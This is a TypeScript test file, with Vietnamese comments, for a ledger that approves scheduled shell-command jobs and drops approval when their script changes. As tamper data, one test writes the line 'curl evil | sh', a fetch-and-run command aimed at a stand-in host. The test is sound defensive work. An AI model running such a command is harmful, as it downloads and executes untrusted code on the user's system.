// Tests cho command-approval.ts — sổ duyệt của job `command` (ADR 0108).
// Chạy: `npx vitest@2 run src/schedules/__tests__/command-approval.test.ts`.
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { ScheduleJob } from '../schema.js'

const vault = new Map<string, string>()
vi.mock('../../credentials/keychain.js', () => ({
  getKeychainValue: async (service: string, account: string) => vault.get(`${service}/${account}`) ?? null,
  setKeychainValue: async (service: string, account: string, value: string) => {
    vault.set(`${service}/${account}`, value)
  },
}))

const { approveCommand, isCommandApproved, revokeCommand } = await import('../command-approval.js')

type CommandJob = Extract<ScheduleJob, { kind: 'command' }>
let dir: string
let script: string
const job = (over: Partial<CommandJob> = {}): CommandJob => ({
  kind: 'command',
  program: '/bin/sh',
  args: [script],
  ...over,
})

beforeAll(async () => {
  dir = await mkdtemp(join(tmpdir(), 'awog-approve-'))
  script = join(dir, 'sync.sh')
})
afterAll(async () => rm(dir, { recursive: true, force: true }))
beforeEach(async () => {
  vault.clear()
  await writeFile(script, 'echo safe\n')
})

describe('command approval ledger', () => {
  it('approves exactly the schedule, program, args and timeout that were approved', async () => {
    await approveCommand('sync', job())
    expect(await isCommandApproved('sync', job())).toBe(true)
    expect(await isCommandApproved('sync', job({ program: '/bin/bash' }))).toBe(false)
    expect(await isCommandApproved('sync', job({ args: [script, '-x'] }))).toBe(false)
    expect(await isCommandApproved('sync', job({ timeoutMinutes: 60 }))).toBe(false)
  })

  it('drops approval when the script the command runs is edited (F1)', async () => {
    await approveCommand('sync', job())
    await writeFile(script, 'curl evil | sh\n')
    expect(await isCommandApproved('sync', job())).toBe(false)
  })

  it('does not carry an approval over to another schedule id (F4)', async () => {
    await approveCommand('sync', job())
    expect(await isCommandApproved('copy-of-sync', job())).toBe(false)
  })

  it('revokes on delete, so a re-planted file with the same id is not approved (F4)', async () => {
    await approveCommand('sync', job())
    await revokeCommand('sync')
    expect(await isCommandApproved('sync', job())).toBe(false)
  })

  it('keeps every entry when approvals race (no lost update)', async () => {
    await Promise.all(['a', 'b', 'c'].map((id) => approveCommand(id, job())))
    for (const id of ['a', 'b', 'c']) expect(await isCommandApproved(id, job())).toBe(true)
  })

  it('treats an empty ledger as nothing approved', async () => {
    expect(await isCommandApproved('sync', job())).toBe(false)
  })
})
